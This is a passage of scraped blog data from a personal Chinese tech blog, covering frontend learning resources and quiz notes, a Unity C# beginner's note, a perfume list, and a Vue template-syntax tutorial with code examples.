全栈意识 解决问题的能力强 懂得合作和高效沟通 重视工作，同样重视生活 责任心和全局观 个人的进步能带动团队的进步 学习资源 编程导航（包含以下所有资源，强烈推荐 👍）：https://www.code-nav.cn freeCodecamp 在线编程：https://learn.freecodecamp.one/ 阿里云前端实战学习：https://edu.aliyun.com/roadmap/frontend W3Cschool 编程入门实战：https://www.w3cschool.cn/codecamp/ 腾讯云动手实验室：https://cloud.tencent.com/developer/labs/gallery pink老师前端入门教程：https://www.bilibili.com/video/BV14J4114768 MDN 前端文档：https://developer.mozilla.org/zh-CN Node.js 入门：https://cnodejs.org/getstart 前端清单：https://cheatsheets.devtool.tech/ 前端小课：https://lefex.github.io/ 被删的前端游乐场：http://www.godbasin.com/ 《ES6 入门教程》：https://es6.ruanyifeng.com/ 谷歌 Web 开发者：https://developers.google.com/web JavaScript 明星项目：https://risingstars.js.org/2020/zh Best of JS：https://bestofjs.org/ Codewars：https://www.codewars.com/?language=javascript Vue.js examples：https://vuejsexamples.com/ 前端资讯 掘金资讯：https://juejin.cn/news InfoQ：https://www.infoq.cn/topic/Front-end daily.dev：https://daily.dev/ 技术博客 掘金：https://juejin.cn/frontend 腾讯前端 IMWEB：http://imweb.io 腾讯 Web 前端团队 Alloy Team：http://www.alloyteam.com 淘宝前端团队：http://taobaofed.org 百度 Web 前端研发部：http://fex.baidu.com 京东凹凸实验室：https://aotu.io 360 奇舞团：https://75team.com 七牛团队技术博客：http://blog.qiniu.com 有赞技术团队：https://tech.youzan.com/tag/front-end/ 百度 EFE Tech：https://efe.baidu.com/ css-tricks：https://css-tricks.com/archives web.dev：https://web.dev/blog/ 学习要点 前期学习以培养兴趣为主，不要过于追求深层理解。 前端学习不能靠死记硬背，要多敲代码、多做项目实践。 不要急于求成，踏实积累才是硬道理。 `` 面试错题 网络 下列关于Window Location 说法错误的是（ 1）: location.host 返回 web 主机的域名 location.pathname 返回当前页面的路径和文件名 location.port 返回 web 主机的端口 （80 或 443） location.protocol 返回所使用的 web 协议（http: 或 https:） 返回web主机域名的是location.hostname location.host的返回将包含端口号，端口号为http默认的443时则省略 通常情况下，一个URL的格式是: 协议//主机:端口/路径名称?搜索条件 HTML 以下哪个项目不是可以在HTML文档中使用的特殊字符(2) &gt; 123- ``` &amp;tl; © 123- ``` HTML中以&amp;开头;结尾的字符串代表转义字符 其中&amp;lt;代表&lt;(less then) 其中&amp;gt;代表&lt;(great then) 而&amp;tl;并不具备任何转义映射关系 此外，常用的转义还有： 字符 十进制 转义字符 &quot; &quot; &amp;quot; &amp; &amp; &amp;amp; &lt; &lt; &amp;lt; &gt; &gt; &amp;gt; 不断开空格(non-breaking space) &amp;nbsp; VUE vue用于绑定DOM属性的指令(3) v-on v-model v-bind v-html vue中： v-on用于绑定事件 v-model用于双向绑定 v-bind用于绑定DOM属性 v-html用于使标签内html语法渲染 关于Vue组件间通信说法错误的是（ 4 ） Vuex可以实现任何关系的组件间的通信 如果子组件修改，通过props获取的父组件传过去的字符串或数字会报错 子组件可以通过$emit给父组件传值 可以通过context进行组件间传值 vue中组件间传值可以通过以下三种方式： $emit委托给父组件 事件总线 Vuex 通过props获取的父组件的基本数据类型的值，修改时会报错 context是react中提供的组件传值方式，vue不提供 VUEX 关于Vuex说法错误的是（ 3 ） Vuex可以用来管理数据 Vuex也可以实现组件间的传值 Vuex的属性有state、mutations、actions、setters等 mutation中的方法按照规定最好不要涉及异步方法 Vuex的属性有 state 存储状态 mutations 同步函数 actions 异步函数，并且调用的时mutations getters 派生状态，类似vue中的计算属性（computed） module 组件，可以包含state，mutations，actions，getters甚至module","categories":[{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"}]},{"title":"Unity学习笔记","slug":"Unity学习笔记","date":"2023-05-25T08:29:18.000Z","updated":"2024-07-30T11:26:33.916Z","comments":true,"path":"2023/05/25/Unity学习笔记/","permalink":"http://enderxiao.github.io/2023/05/25/Unity%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"独立游戏开发者！进化之路！","text":"独立游戏开发者！进化之路！ Unity 开源游戏引擎 安装 使用UnityHub安装 许可证激活 激活个人版许可证 Unity工程 创建项目时可以创建2D\\3D项目，但创建完成后项目结构是相同的，区别在于视图不同，例如图像时作为纹理还是精灵图导入。 创建了3D的项目也可以直接改为3D 创建项目时可以选择使用PlasticSCM进行版本管理 3D or 2D Unity将游戏场景分为了五类： 全3D 正交3D 包含3D图形的2D玩法 包含视差效果的的2D玩法 全2D 上述前4项均需要以3D模式创建项目。 项目结构 Unity创建的3D项目大致包含如下一些结构： 12345Assets // 资源目录，例如场景、脚本、模型等等资源文件均存放于此Library // 库，系统库的存放路径Logs // 日志文件Packages // 导入的第三方包ProjectSettings // 工程设置 如果想要移动工程的话，只需要将Assets和Library移动出去即可 Unity界面 © Game 视图通过场景摄像机模拟最终渲染的游戏的外观效果。单击 Play 按钮时，模拟开始。 (D) Scene 视图可用于直观导航和编辑场景。根据正在处理的项目类型，Scene 视图可显示 3D 或 2D 透视图。 (G) The Project 窗口 展示项目文件中Assets文件夹下可以再项目中使用的资源。当往项目中引入资源时，它们会出现在这里 脚本创建 在Assets目录下可以通过右键来创建C#脚本文件，双击打开后，会直接跳到VS，实际上VS在其中只起到编辑器的功能 如果要使用其他的编辑工具，可以在Edit -&gt; proferences -&gt; External Tools -&gt; External Script Editor来修改 Unity程序 Rigidbody2D velocity 用来设置刚体的速度 其值为一个Vector2对象用来表示一个2维向量 包含两个属性x,y分别代表两个轴上的分量 Input 获取键盘输入 GetKey(name) 其中name可以为KeyCode.Space等对象 该函数能够监听从键盘按下到键盘抬起整个过程的事件 即只要不松开键盘就一直能够监听到 GetKeyDown(name) 监听键盘按下事件 GetKeyUp(name) 监听键盘抬起事件 GetButtonDonw(name) name为字符串，用于监听&quot;jump&quot;等Unity预定义键盘映射 GetAxis(name) name为字符串 &quot;Horizontal&quot;等坐标轴变化，使用左右键等Unity预定义为Horizontal的按键可观测其变化 值为-1~1间的小数 可以理解为监听某个轴上的加速度，加速度逐渐增大，最大值为1最小值为-1 松开后值会逐渐衰减，按下后值会逐渐增大 GetAxisRaw(name) 同上 但取值为-1~1的整数 MonoBehaviour 生命周期： Start() 第一帧加载结束后调用 Update() 加载每一帧时调用 GetComponent 该方法会搜索当前对象下指定类的Component并返回对象 GetComponent&lt;class&gt;() 封装 public与private 两者的区别除了面对对象中的访问区别外 设置为public的属性可以在Unity的物体对象的脚本中看到，并且进行赋值 但private的属性并不会在其中显示 例如GridBody刚体对象属性，通常设为public，这样我们就能很轻松的在Unity中将精灵的刚体推拽给它以赋值 但很多时候，属性应该默认为private，同时又需要再Unity中显示我们就需要使用SerializeField: 1234567891011121314151617181920212223242526272829303132333435363738394041424344using System.Collections;using System.Collections.Generic;using System.Diagnostics.Tracing;using UnityEngine;public class Player : MonoBehaviour&#123; // x轴方向加速度 // [SerializeField] private float xInpute; // 获取刚体 [SerializeField] private Rigidbody2D rb; // 速度控制 [SerializeField] private float moveSpeed; // 弹跳力 [SerializeField] private float jumpForce; // Start is called before the first frame update void Start() &#123; // 给刚体一个初速度，水平方向速度为5，竖直方向为原本的速度 // rb.velocity = new Vector2 (5, rb.velocity.y); &#125; // Update is called once per frame void Update() &#123; xInpute = Input.GetAxisRaw(&quot;Horizontal&quot;); // 通过输入来改变物体的速度 rb.velocity = new Vector2(xInpute * moveSpeed, rb.velocity.y); // 条约 if (Input.GetKeyDown(KeyCode.Space)) &#123; Debug.Log(&quot;Jump&quot;); rb.velocity = new Vector2(rb.velocity.x, jumpForce); &#125; &#125;&#125; Unity中public的属性是默认序列化的，如果不希望public的属性被显示，则需要使用[HidenInInspector]进行隐藏 该特性脱胎于C#的Attribute，类似于python的修饰器，以及java的注解 123456789101112131415// 定义namespace System&#123; public sealed class ObsoleteAttribute : Attribute &#123; // ... public ObsoleteAttribute(string? message, bool error); &#125;&#125;// 使用[Obsolete(&quot;使用xxx方法替代。&quot;,false)] class Program &#123; // ...&#125;","categories":[{"name":"开发工具","slug":"开发工具","permalink":"http://enderxiao.github.io/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"},{"name":"Unity","slug":"开发工具/Unity","permalink":"http://enderxiao.github.io/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Unity/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"游戏开发工具","slug":"游戏开发工具","permalink":"http://enderxiao.github.io/tags/%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"},{"name":"Unity","slug":"Unity","permalink":"http://enderxiao.github.io/tags/Unity/"}]},{"title":"月亮姑娘的香味","slug":"月亮姑娘的香味","date":"2023-05-05T08:32:13.000Z","updated":"2024-07-30T11:26:33.936Z","comments":true,"path":"2023/05/05/月亮姑娘的香味/","permalink":"http://enderxiao.github.io/2023/05/05/%E6%9C%88%E4%BA%AE%E5%A7%91%E5%A8%98%E7%9A%84%E9%A6%99%E5%91%B3/","excerpt":"","text":"MEMO 茵莱茶桂 —高级 好穿 欧梦德杰尼 气（空灵桂花）—桂花点缀茶香 爱马仕 云南丹桂—甜+茶+丢丢桂花 帝国之香 紫禁桂花—皮革茶桂 野兽派 桂花乌龙—柠檬柑橘糖+桂花乌龙茶6.浮香堂&amp;五朵里 桂 秋霞 桂花王 金芭蕾 桂花 香榭格雷 中国桂花 芦丹氏 八月夜桂花—蜂蜜+白茉莉 欧梦德杰尼 桂花 欧珑 桂香月夜—桂花雪松木 浮香堂 月出—金桂+乌木玫瑰 TDC 桂花 —跟桂花半毛钱关系也没有 莫娜·奥锐欧 桂花沉香 —买不起 **** 牛奶香 【莎邦】浓缩纯牛奶（旺仔牛奶糖，齁） 【帝门特】浓缩牛奶（炼乳） 【詹姆斯海利】椰子（椰汁，留香持久） 【娇兰】椰影白沙（椰奶水果糖，不起腻） 【芦丹氏】香子兰木（奶油蛋糕，甜，非常甜） 【迪奥】红毒（香草奶油+晚香玉，妈味，又奶又女人，不适合小女孩儿） 【阿蒂仙】哈瓦那香草（百利甜，奶香+酒香，自带微醺感） 【普拉达】糖果（太妃糖，焦糖+温柔脂粉） 【欧珑】梦幻香草（香草冰淇淋，清甜） 无花果 【蒂普提克】无花果（无花果还原最高，奶狗也可用） 【阿蒂仙】无花果（绿叶调时间短，越来越甜，无花果蜜饯） 【帕尔马】阿玛菲无花果（无花果存在感低，柔弱感） 檀香 【爱马仕】檀香玛索亚（牛奶+无花果+檀香，小清新） 【芦丹氏】白檀（木质调，沉稳奶香)","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"关于我们","slug":"Life/关于我们","permalink":"http://enderxiao.github.io/categories/Life/%E5%85%B3%E4%BA%8E%E6%88%91%E4%BB%AC/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"香水","slug":"香水","permalink":"http://enderxiao.github.io/tags/%E9%A6%99%E6%B0%B4/"}]},{"title":"前端VUE学习笔记","slug":"前端VUE学习笔记","date":"2023-04-18T11:51:07.000Z","updated":"2024-07-30T11:26:33.925Z","comments":true,"path":"2023/04/18/前端VUE学习笔记/","permalink":"http://enderxiao.github.io/2023/04/18/%E5%89%8D%E7%AB%AFVUE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"学了React，再学个VUE试试","text":"学了React，再学个VUE试试 VUE简介 采用mvvm架构设计的前端框架 View：视图层（UI ViewModel ：业务逻辑层（一切JS Model：数据层（存储数据及对数据处理 渐进式学习框架，即不仅支持使用VUE进行项目构建，还支持某一功能的VUE构建，甚至某一HTML页面的VUE构建 VUE的使用方式有如下几种 无需构建步骤，渐进式增强静态HTML 在任何页面中作为Web Components嵌入 单页应用（SPA） 全栈/服务端渲染（SSR） Jamstack/静态站点生成（SSG） 开发桌面端、移动端、WebGL，甚至是命令行终端中的界面 Vue2 VS Vue3 Vue2采用OptionsAPI，代码较为分散 Vue3采用CompositionAPI，使得代码分明 Vue3新特性 重写了双向数据绑定 2中使用Object.defineProperty实现 3中使用ES6标准中的Proxy劫持 因为Proxy能够更好的处理数组 VDOM性能瓶颈得到提升 使用patch flag做静态标记，使得对比时不会进行全量对比，从而提升性能 支持Fragments template中可以写多个节点了 支持TSX和JSX的写法 增加Suspense和teleport 增加多v-model 支持Tree-Shaking Composition API Setup语法糖式编程 环境配置 nodejs nvm(nodejs环境管理工具) vite 官方文档 https://cn.vuejs.org/ VSCode支持 volar Vue Language Features TypeScript Vue Plugin 需要注意的是Vue2的代码提示Vetur与Volar存在冲突，需要禁用 Vue Vue API风格 选项式 API（Vue2） 组合式 API（Vue3） 选项式API 使用包含多个选项的对象来描述组件的逻辑。 例如data,methods,mounted.选项所定义的属性都会暴露在函数内部的this上，它会指向当前的组件实例 12345678910111213141516171819202122&lt;script setip&gt; export default &#123; data() &#123; return &#123; count: 0 &#125; &#125;, methods: &#123; increment() &#123; this.count++ &#125; &#125;, mounted() &#123; console.log(`The initial count is $&#123;count.value&#125;.`) &#125; &#125;&lt;/script&gt;&lt;templare&gt; &lt;button @click=&quot;increment&quot;&gt; Count is : &#123;&#123; count &#125;&#125; &lt;/button&gt;&lt;/templare&gt; 组合式API 通过组合式API，可以使用导入的API函数来描述组件逻辑 123456789101112131415&lt;script setup&gt; import &#123; ref, onMounted &#125; from &#x27;vue&#x27; const count = ref(0) function increment() &#123; count.value++ &#125; onMounted(() =&gt; &#123; console.log(`The initial count is $&#123;count.value&#125;.`) &#125;)&lt;/script&gt;&lt;templare&gt; &lt;button @click=&quot;increment&quot;&gt; Count is : &#123;&#123; count &#125;&#125; &lt;/button&gt;&lt;/templare&gt; API风格选择 当不需要使用构建工具，或者打算在低复杂度的场景使用Vue时，例如渐进增强的应用场景，采用选项式API 当打算用Vue构建完整的单页应用时，推荐采用组合式API+单文件组件 Vue项目结构 使用如下命令创建Vue项目时可以很方便的选择为自己的项目添加哪些组件： 1npm init vue@latest 例如添加ESLint、Vue Router、Prettier、对TS的支持、对TSX、JSX的支持等等 上述命令将会安装并执行create-vue命令 随后创建的目录包含以下结构： 1234567891011--public //用于存放静态资源，例如浏览器图标，且不会被Vite编译--src //同样用于存放静态资源--components //存放组件App.vue //Vue的全局入口main.ts //全局TS文件style.css //脚手架自带样式文件vite-env.d.ts //声明文件扩充，例如为TS做.vue的文件声明扩充index.html //vite与webpack不同，使用html作为入口文件，使用es module的形式package.json //项目描述文件，项目名，版本信息，依赖版本，开发环境版本依赖tsconfig.json //ts配置文件vite.vonfig.ts //vite配置文件 使用npm install命令安装好依赖之后，使用npm run dev运行即可。 运行命令会首先再当前目录的node_module中寻找是否安装了相应命令软件，如果没有回去全局node_module中继续寻找、如果还是没有则会继续去环境变量中寻找，如果再没有则会报错。 Vue模板语法 Vue使用基于HTML的模板语法，弄个声明式地将其组件实例的数据绑定到呈现的DOM上。所有的Vue模板都是语法层面合法的HTML，可以呗符合规范的浏览器和HTML解析器解析 文本插值 最基本的数据绑定形式，使用“Mustache”语法（双大括号） 123456789101112131415&lt;template&gt; &lt;p&gt; &#123;&#123; msg &#125;&#125; &lt;/p&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; msg:&quot;神奇海螺&quot; &#125; &#125; &#125;&lt;/script&gt; 使用JS表达式 每个绑定仅支持单一表达式，即能够被求值的JS代码，一个简单的判断方法是是否可以合法地写在return后面。 需要注意的是，不符合if…else这样的多行表达式 1234567891011121314151617181920212223&lt;template&gt; &lt;p&gt; &#123;&#123; number + 1 &#125;&#125; &lt;/p&gt; &lt;p&gt; &#123;&#123; ok ? &#x27;YES&#x27; : &#x27;NO&#x27; &#125;&#125; &lt;/p&gt; &lt;p&gt; &#123;&#123; message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125;&#125; &lt;/p&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; number: 10, ok: true, msg:&quot;神奇海螺&quot; &#125; &#125; &#125;&lt;/script&gt; 原始HTML 如果想要使用这样的方式直接插入可被渲染的HTML，则需要使用v-html指令 123456789101112131415161718&lt;template&gt; &lt;p&gt; 纯文本: &#123;&#123; rawHTML &#125;&#125; &lt;/p&gt; &lt;p&gt; 属性: &lt;span v-html=&quot;rawHTML&quot;&gt;&lt;/span&gt; &lt;/p&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; rawHTML: &quot;&lt;a href=&#x27;https://baidu.com&#x27;&gt; 百度&lt;/a&gt;&quot; &#125; &#125; &#125;&lt;/script&gt; 属性绑定 属性需要使用v-bind指令 12345678910111213141516&lt;template&gt; &lt;div v-bind:id=&quot;dynamicId&quot; v-bind:class=&quot;msg&quot;&gt; 测试 &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; msg:&quot;active&quot;, dynamicId:&quot;appID&quot; &#125; &#125; &#125;&lt;/script&gt; 如果绑定的元素值为null或者undefined，那么该属性将从渲染的元素上移除 此外由于v-bind比较常用，Vue提供了:语法糖，上面的v-bind可以直接省略v-bind写作： 1&lt;div :id=&quot;dynamicId&quot; :class=&quot;msg&quot;&gt;测试&lt;/div&gt; 动态绑定多个属性 可以以直接使用JS对象对属性进行数据绑定： 123456789101112131415161718&lt;template&gt; &lt;div v-bind=&quot;objectOfAttrs&quot;&gt; 测试 &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; objectOfAttrs: &#123; class:&quot;active&quot;, id:&quot;appID&quot; &#125; &#125; &#125; &#125;&lt;/script&gt; 条件渲染 类似JS中的条件语句： v-if v-else v-else-if v-show v-if 会在指令表达式返回为true时渲染 123456789101112131415&lt;template&gt; &lt;div v-if=&quot;flag&quot;&gt; 你能看见我么 &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; flg:true, &#125; &#125; &#125;&lt;/script&gt; v-else 可以为v-if添加一个else区块 123456789101112131415161718&lt;template&gt; &lt;div v-if=&quot;flag&quot;&gt; 你能看见我么 &lt;/div&gt; &lt;div v-else&gt; 那你还是看看我吧 &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; flg:true, &#125; &#125; &#125;&lt;/script&gt; v-else-if 可连续多次重复使用 123456789101112131415161718192021222324&lt;template&gt; &lt;div v-if=&quot;type === &#x27;A&#x27;&quot;&gt; A &lt;/div&gt; &lt;div v-else-if=&quot;type === &#x27;B&#x27;&quot;&gt; B &lt;/div&gt; &lt;div v-else-if=&quot;type === &#x27;C&#x27;&quot;&gt; C &lt;/div&gt; &lt;div v-else&gt; Not A/B/C &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; type:&quot;D&quot;, &#125; &#125; &#125;&lt;/script&gt; v-show 用法与v-if基本相同 123456789101112131415&lt;template&gt; &lt;div v-show=&quot;flag&quot;&gt; 你能看见我么 &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; flg:true, &#125; &#125; &#125;&lt;/script&gt; v-show与v-if v-if确保了在切换状态时，条件块内的时间监听器和子组件都会被销毁与重建，同时它也是惰性的，即如果在出自渲染时条件值为false，则不会做任何事，只有当条件首次变为true时才会被渲染。 v-show元素无论初始条件如何，始终会被渲染，只有CSSdisplay属性会被切换 总的来说v-if有更高的切换开销，而v-show有更高的初始渲染开销。因此，如果需要频繁切换则使用v-show，如果运行时条件很少改变，则v-if更合适 列表渲染 使用v-for指令基于一个数组来渲染一个列表。v-for指令需要使用item in items形式的特殊语法，其中items是源数据的数组，而item是迭代项的别名 1234567891011121314151617&lt;template&gt; &lt;div&gt; &lt;p v-for=&quot;item in names&quot;&gt; &#123;&#123; item &#125;&#125; &lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; names:[&quot;A&quot;, &quot;B&quot;, &quot;C&quot;] &#125; &#125; &#125;&lt;/script&gt; 复杂数据 例如请求得到的Json数据 1234567891011121314151617181920212223242526&lt;template&gt; &lt;div v-show=&quot;item in result&quot;&gt; &lt;p&gt; &#123;&#123; item.title &#125;&#125; &lt;/p&gt; &lt;img :src=&quot;item.avator&quot; alt=&quot;&quot;&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; result:[&#123; &quot;id&quot;: 10010, &quot;title&quot;: 中国电信 &quot;avator&quot;: &quot;https://pic.dianxin.com/avator/10010&quot; &#125;,&#123; &quot;id&quot;: 10086, &quot;title&quot;: 中国移动 &quot;avator&quot;: &quot;https://pic.dianxin.com/avator/10010&quot; &#125;] &#125; &#125; &#125;&lt;/script&gt; v-for也支持使用可选的位置索引 1234567891011121314151617&lt;template&gt; &lt;div&gt; &lt;p v-for=&quot;(item, index) in names&quot;&gt; &#123;&#123; item &#125;&#125;:&#123;&#123; index &#125;&#125; &lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; names:[&quot;A&quot;, &quot;B&quot;, &quot;C&quot;] &#125; &#125; &#125;&lt;/script&gt; xxxxxxxxxx3 1input::placeholder {2 color: red3}css v-for还可以用于遍历对象的所有属性 1234567891011121314151617181920&lt;template&gt; &lt;div&gt; &lt;p v-for=&quot;(value, key, index) in userInfo&quot;&gt; &#123;&#123; value &#125;&#125;：&#123;&#123; key &#125;&#125;:&#123;&#123; index &#125;&#125; &lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; userInfo:&#123; name:&quot;iwen&quot;, age:20 &#125; &#125; &#125; &#125;&lt;/script&gt; 通过key管理状态 Vue默认采用就地更新的策略。 也就是说当渲染一组数据，例如[1, 2, 3]后，如果我们将数据修改为[1, 3, 2]，那么Vue会将整个列表重新渲染一遍，而不是移动已经渲染的DOM元素。 但可以通过key属性为数据提供标识，从而重用或重排现有元素。 1234567891011121314151617&lt;template&gt; &lt;div&gt; &lt;p v-for=&quot;(item, index) in names&quot; :key=&quot;index&quot;&gt; &#123;&#123; value &#125;&#125; &lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; names:[&quot;A&quot;, &quot;B&quot;, &quot;C&quot;] &#125; &#125; &#125;&lt;/script&gt; 注意key在绑定时需要使用一个基础类型的值，例如string或number 推荐为每个item都加上key 并且在工作场景中，不推荐使用index作为key，因为我们无法确定新插入的数据是否会改变原有元素的index-item对应关系（比如在头部插入新数据） 事件处理 可以使用v-on（简写为@）来监听DOM事件，并在事件出发时执行对应的JS 事件处理器的值可以是： 内敛事件处理器：事件被出发时执行的内敛JS语句（与onclick类似） 方法事件处理器：一个指向组件上定义的方法的属性名或是路径 内联事件处理器 用于简单场景 1234567891011121314151617181920&lt;template&gt; &lt;div&gt; &lt;button @click=&quot;count++&quot;&gt; Add 1 &lt;/button&gt; &lt;p&gt; Count is : &#123;&#123; count &#125;&#125; &lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; count:0 &#125; &#125; &#125;&lt;/script&gt; 方法事件处理器 项目中常用 12345678910111213141516171819202122232425&lt;template&gt; &lt;div&gt; &lt;button @click=&quot;addCount()&quot;&gt; Add 1 &lt;/button&gt; &lt;p&gt; Count is : &#123;&#123; count &#125;&#125; &lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; count:0 &#125; &#125;, methods: &#123; addCount() &#123; this.count+=1 &#125; &#125; &#125;&lt;/script&gt; 事件参数 事件参数可以获取event对象和通过事件传递数据 1234567891011121314151617181920212223242526&lt;template&gt; &lt;div&gt; &lt;button @click=&quot;addCount()&quot;&gt; Add 1 &lt;/button&gt; &lt;p&gt; Count is : &#123;&#123; count &#125;&#125; &lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; count:0 &#125; &#125;, methods: &#123; addCount(e) &#123; console.log(e); this.count+=1 &#125; &#125; &#125;&lt;/script&gt; 传递参数 1234567891011121314151617181920212223242526&lt;template&gt; &lt;div&gt; &lt;button @click=&quot;count(&#x27;hello&#x27;)&quot;&gt; Add 1 &lt;/button&gt; &lt;p&gt; Count is : &#123;&#123; count &#125;&#125; &lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; count:0 &#125; &#125;, methods: &#123; addCount(msg) &#123; console.log(msg); this.count+=1 &#125; &#125; &#125;&lt;/script&gt; 传递参数的同时可能传递event，但需要增加$event$作为参数 123456789101112131415161718192021222324252627&lt;template&gt; &lt;div&gt; &lt;button @click=&quot;count(&#x27;hello&#x27;, $event)&quot;&gt; Add 1 &lt;/button&gt; &lt;p&gt; Count is : &#123;&#123; count &#125;&#125; &lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; count:0 &#125; &#125;, methods: &#123; addCount(msg, e) &#123; console.log(e); console.log(msg); this.count+=1; &#125; &#125; &#125;&lt;/script&gt; 事件修饰符 调用事件时通常会调用event.preventDefault()或event.stopPropagation()来组织事件冒泡。 如果可以更专注于数据逻辑而不用去处理DOM事件的细节会更方便 为了解决这一问题，Vue为v-on提供了时间修饰符，常用的有以下几种： .stop .prevent .onece .enter … 阻止默认事件 1234567891011121314151617181920212223242526272829303132333435&lt;template&gt; &lt;div&gt; &lt;a @click.prevent=&quot;clickHandle&quot; href=&quot;https://baidu.com&quot;&gt;百度&lt;/a&gt; &lt;div @click=&quot;clickDiv&quot;&gt; &lt;p @click.stop=&quot;clickP&quot;&gt; 测试冒泡 &lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; count:0 &#125; &#125;, methods: &#123; clickHandle(e) &#123; // 使用.prevent修饰后相当于调用了如下代码 // e.preventDefault(); console.log(&quot;点击了&quot;); &#125;, clickDiv() &#123; console.log(&quot;点击了Div&quot;); &#125;, clickP(e) &#123; // 使用.stop修饰后相当于调用了如下代码 // e.stopPropagation(); console.log(&quot;点击了P&quot;); &#125; &#125; &#125;&lt;/script&gt; 动态事件 vue中支持动态事件绑定： 使用[]将用于管理事件的变量包裹即可 123456789101112131415161718&lt;template&gt; &lt;div&gt; &lt;button @[event]=&quot;addCount&quot;&gt; Add 1 &lt;/button&gt; &lt;p&gt; Count is : &#123;&#123; count &#125;&#125; &lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script setup lang=&#x27;ts&#x27;&gt; const event = &#x27;click&#x27; let count = 0 const addCount = () =&gt; &#123; count++ &#125;&lt;/script&gt; 数组变化的侦测 变更方法 Vue能够监听响应式数组的变更方式，并在它们贝调用时出发相关的更新。这些变更方法包括： push() pop() shift() unshift() splice sort() reverse() 1234567891011121314151617181920212223242526272829&lt;template&gt; &lt;div&gt; &lt;p v-for=&quot;(item, index) in names&quot; :key=&quot;index&quot;&gt; &#123;&#123; item &#125;&#125; &lt;/p&gt; &lt;button @click=&quot;clickAddNamesHandle&quot;&gt; 增加数据 &lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; names: [ &quot;iwen&quot;, &quot;ime&quot;, &quot;frank&quot; ] &#125; &#125;, methods: &#123; clickAddNamesHandle() &#123; this.names.push(&quot;sakura&quot;) &#125; &#125; &#125;&lt;/script&gt; 替换一个数组 除了使用会对原数组进行更改的变更方法外，有一些不可变（immutable）方法，例如fliter()，concat()和slice()，这些都不会对原数组进行修改，而总是返回一个新数组。这种情况需要使用新数组替换旧数组 1234567891011121314151617181920212223242526272829303132333435&lt;template&gt; &lt;div&gt; &lt;h3&gt; 数组1 &lt;/h3&gt; &lt;p v-for=&quot;(item, index) in nums1&quot; :key=&quot;index&quot;&gt; &#123;&#123; item &#125;&#125; &lt;/p&gt; &lt;h3&gt; 数组2 &lt;/h3&gt; &lt;p v-for=&quot;(item, index) in nums2&quot; :key=&quot;index&quot;&gt; &#123;&#123; item &#125;&#125; &lt;/p&gt; &lt;button @click=&quot;filterHandle&quot;&gt; 合并数据 &lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; nums1:[1,2,3,4,5], nums2:[6,7,8,9,10] &#125; &#125;, methods: &#123; filterHandle() &#123; this.nums1 = this.nums1.concat(this.nums2) &#125; &#125; &#125;&lt;/script&gt; 计算属性 在template中虽然可以使用JS表达式进行一些计算，但在其中屑很多逻辑代码会使template变得臃肿，难以维护。因此Vue提出计算属性来解决这一问题 1234567891011121314151617181920212223&lt;template&gt; &lt;div&gt; &lt;h3&gt; &#123;&#123; baidu.name &#125;&#125; &lt;/h3&gt; &lt;p&gt; &#123;&#123; baidu.content.length &gt; 0 ? &quot;Yes&quot; : &quot;No&quot;&#125;&#125; &lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; data() &#123; return &#123; baidu: &#123; name: &quot;百度&quot;, content: [&quot;前端&quot;， &quot;Java&quot;, &quot;python&quot;] &#125; &#125; &#125; &#125;&lt;/script&gt; 上述代码在模板中使用了逻辑表达式，一旦出现bug，上述逻辑代码由于与逻辑块分散，难以定位。 1234567891011121314151617181920212223242526272829&lt;template&gt; &lt;div&gt; &lt;h3&gt; &#123;&#123; baidu.name &#125;&#125; &lt;/h3&gt; &lt;p&gt; &#123;&#123; baiduContent &#125;&#125; 